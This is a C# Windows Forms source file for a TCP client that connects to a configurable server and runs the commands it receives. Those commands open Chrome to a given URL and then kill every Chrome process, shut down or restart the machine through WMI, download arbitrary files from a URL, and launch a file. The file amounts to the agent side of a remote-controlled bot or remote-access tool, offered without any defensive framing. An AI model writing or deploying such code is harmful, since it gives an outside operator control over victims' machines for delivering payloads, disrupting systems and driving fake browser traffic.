using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using System.Management;
using System.IO;

namespace TCPClient01
{
    public partial class Form1 : Form
    {
        TcpClient mTcpClient;
        byte[] mRx;

        WebClient wc = new WebClient();
       

        public Form1()
        {
            InitializeComponent();
        }

        private void btnConnect_Click(object sender, EventArgs e)
        {
        
            IPAddress ipa;
            int nPort;

            try
            {
                if (string.IsNullOrEmpty(tbServerIP.Text) || string.IsNullOrEmpty(tbServerPort.Text))
                    return;
                if (!IPAddress.TryParse(tbServerIP.Text, out ipa))
                {
                    MessageBox.Show("Please supply an IP Address.");
                    return;
                }

                if (!int.TryParse(tbServerPort.Text, out nPort))
                {
                    nPort = 23000;
                }

                mTcpClient = new TcpClient();
                mTcpClient.BeginConnect(ipa, nPort, onCompleteConnect, mTcpClient);
            }
            catch (Exception exc)
            {
                MessageBox.Show(exc.Message);
            }
        }

        void onCompleteConnect(IAsyncResult iar)
        {
            TcpClient tcpc;

            try
            {
                tcpc = (TcpClient)iar.AsyncState;
                tcpc.EndConnect(iar);
                mRx = new byte[512];
                tcpc.GetStream().BeginRead(mRx, 0, mRx.Length, onCompleteReadFromServerStream, tcpc);

            }
            catch (Exception exc)
            {
                MessageBox.Show(exc.Message);
            }
        }

        void onCompleteReadFromServerStream(IAsyncResult iar)
        {
            TcpClient tcpc;
            int nCountBytesReceivedFromServer;
            string strReceived;

            try
            {
                tcpc = (TcpClient)iar.AsyncState;
                nCountBytesReceivedFromServer = tcpc.GetStream().EndRead(iar);

                if (nCountBytesReceivedFromServer == 0)
                {
                    MessageBox.Show("Connection broken.");
                    return;
                }
                strReceived = Encoding.ASCII.GetString(mRx, 0, nCountBytesReceivedFromServer);

                string splitCmd = strReceived;
                string[] cmd = splitCmd.Split(' ');

                //if (cmd[0] == "visit")

                //{
                //    printLine("Just visited: " + cmd[1] + " and will close in: " + int.Parse(cmd[2]) + " seconds");
                //    visitUrl(cmd[1], int.Parse(cmd[2]));
                //}

             
                

                switch (cmd[0])
                {
                    case "visit":
                        printLine("Just visited: " + cmd[1] + " and will close in: " + int.Parse(cmd[2]) + " seconds");
                        visitUrl(cmd[1], int.Parse(cmd[2]));
                        break;
                    case "shutdown":
                        Shutdown();
                        break;
                    case "restart":
                        Restart();
                        break;
                    case "download":
                        Download(cmd[1]);
                        break;
                    case "execute":
                        Execute(cmd[1]);
                        break;

                }


                mRx = new byte[512];
                tcpc.GetStream().BeginRead(mRx, 0, mRx.Length, onCompleteReadFromServerStream, tcpc);

            }
            catch (Exception exc)
            {
                MessageBox.Show(exc.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void printLine(string _strPrint)
        {
            tbConsole.Invoke(new Action<string>(doInvoke), _strPrint);
        }

        public void doInvoke(string _strPrint)
        {
            tbConsole.Text = _strPrint + Environment.NewLine + tbConsole.Text;
        }


        private void tbSend_Click(object sender, EventArgs e)
        {
            byte[] tx;
            
            if (string.IsNullOrEmpty(tbPayload.Text)) return;

            try
            {
                tx = Encoding.ASCII.GetBytes(tbPayload.Text);

                if (mTcpClient != null)
                {
                    if (mTcpClient.Client.Connected)
                    {
                        mTcpClient.GetStream().BeginWrite(tx, 0, tx.Length, onCompleteWriteToServer, mTcpClient);
                    }
                }
            }
            catch (Exception exc)
            {
                MessageBox.Show(exc.Message);
            }
        }
        void onCompleteWriteToServer(IAsyncResult iar)
        {
            TcpClient tcpc;

            try
            {
                tcpc = (TcpClient)iar.AsyncState;
                tcpc.GetStream().EndWrite(iar);
            }
            catch (Exception exc)
            {
                MessageBox.Show(exc.Message);
            }
        }

        private void TbConsole_TextChanged(object sender, EventArgs e)
        {

        }




       

        public void visitUrl(string url, int ct)
        {
            var prs = new ProcessStartInfo("chrome.exe");
            prs.Arguments = url;
            Process.Start(prs);
            timer1.Enabled = true;
            timer1.Start();


            Thread.Sleep(ct * 1000);
            try
            {
                foreach (Process proc in Process.GetProcessesByName("chrome"))
                {
                    proc.Kill();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }



        }

        public void Shutdown()
        {
            ManagementBaseObject mboShutdown = null;
            ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");
            mcWin32.Get();

            // You can't shutdown without security privileges
            mcWin32.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject mboShutdownParams =
                     mcWin32.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            mboShutdownParams["Flags"] = "1";
            mboShutdownParams["Reserved"] = "0";
            foreach (ManagementObject manObj in mcWin32.GetInstances())
            {
                mboShutdown = manObj.InvokeMethod("Win32Shutdown",
                                               mboShutdownParams, null);
            }
        }

        public void Restart()
        {
            ManagementBaseObject mboShutdown = null;
            ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");
            mcWin32.Get();

            // You can't shutdown without security privileges
            mcWin32.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject mboShutdownParams =
                     mcWin32.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            mboShutdownParams["Flags"] = "2";
            mboShutdownParams["Reserved"] = "0";
            foreach (ManagementObject manObj in mcWin32.GetInstances())
            {
                mboShutdown = manObj.InvokeMethod("Win32Shutdown",
                                               mboShutdownParams, null);
            }
        }

        public void Download(string url)
        {
            string[] link = url.Split('/');
            string filename = link[link.Length - 1];

            Uri fileurl = new Uri(url); 

            wc.DownloadFileAsync(fileurl, filename );      

            
          
        }

        public void Execute(string file)
        {
            Process p = new Process();
            ProcessStartInfo pi = new ProcessStartInfo();
            pi.UseShellExecute = true;
            pi.FileName = @"C:\Users\admin\Desktop\CC.png";
            p.StartInfo = pi;

            try
            {
                p.Start();
            }
            catch (Exception Ex)
            {
                //MessageBox.Show(Ex.Message);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
          //  chkSave.Checked = Properties.Settings.Default.CheckBox;
            tbServerIP.Text = Properties.Settings.Default.IPTextBox;
            tbServerPort.Text = Properties.Settings.Default.PortTextBox;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
           // Properties.Settings.Default.CheckBox = chkSave.Checked;
            Properties.Settings.Default.IPTextBox = tbServerIP.Text;
            Properties.Settings.Default.PortTextBox = tbServerPort.Text;
            Properties.Settings.Default.Save();
        }
    }



}

